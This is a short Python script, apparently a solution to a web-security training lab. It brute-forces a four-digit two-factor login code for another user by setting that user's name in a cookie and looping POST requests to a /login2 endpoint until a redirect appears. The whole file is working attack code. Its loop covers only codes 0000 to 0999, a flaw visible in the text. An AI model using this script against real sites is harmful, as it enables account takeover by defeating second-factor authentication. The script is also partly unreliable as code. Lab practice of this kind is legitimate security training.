import requests
from requests_toolbelt.utils import dump
import sys

# 2fa_broken_logic_v1 is 'better' version because of fix (not allowing redirections)

url = ''
session_key = ''
# not sure if this is correct approach but it worked
path= '/login2'

PROXIES = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
HEADERS = {'Host': url,
            'Cookie':'session='+session_key+'; verify=carlos',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_response(response)
    print(data.decode('utf-8'))
    


http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
for i in range(1000):
    r = http.post('https://'+url+path,headers=HEADERS, data='mfa-code='+str('{0:04}'.format(i)))
    sys.stdout.write('\r'+str('{0:04}'.format(i)))
    sys.stdout.flush()
# i was able to get 2fa code this way, not sure why in v1 using r.status_code or r.is_redirect or r.is_permanent_redirect did not confirm 302
# fixed in v1, request returns status code from url user is redirected to

    if 'HTTP/1.1 302 Found' in dump.dump_all(r).decode('utf-8'):
        print(f' 2fa code is = {i}')
        break
    